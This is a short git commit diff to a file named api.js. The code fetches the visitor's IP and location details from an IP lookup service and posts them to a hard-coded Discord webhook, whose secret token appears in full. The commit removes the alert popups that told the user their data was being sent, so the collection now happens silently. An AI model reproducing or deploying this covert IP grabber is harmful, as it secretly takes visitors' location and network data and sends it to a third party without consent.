02d425bec091bd85522d333e3e41be0769165126
RainM09 <rainolatan123@gmail.com>
2026-02-20 00:55:20 +0800

    Update api.js

--- api.js
+++ api.js
@@ -1,11 +1,9 @@
-const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8";
+const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8"
 
 async function sendIPInfo() {
   try {
     const response = await fetch("https://ipapi.co/json/");
     const data = await response.json();
-
-    alert("Fetched IP info! Sending to Discord...");
 
     await fetch(webhook, {
       method: "POST",
@@ -17,9 +15,9 @@ async function sendIPInfo() {
       })
     });
 
-    alert("Sent successfully!");
+    console.log("Sent successfully");
   } catch (error) {
-    alert("Error: " + error);
+    console.error("Error:", error);
   }
 }
 
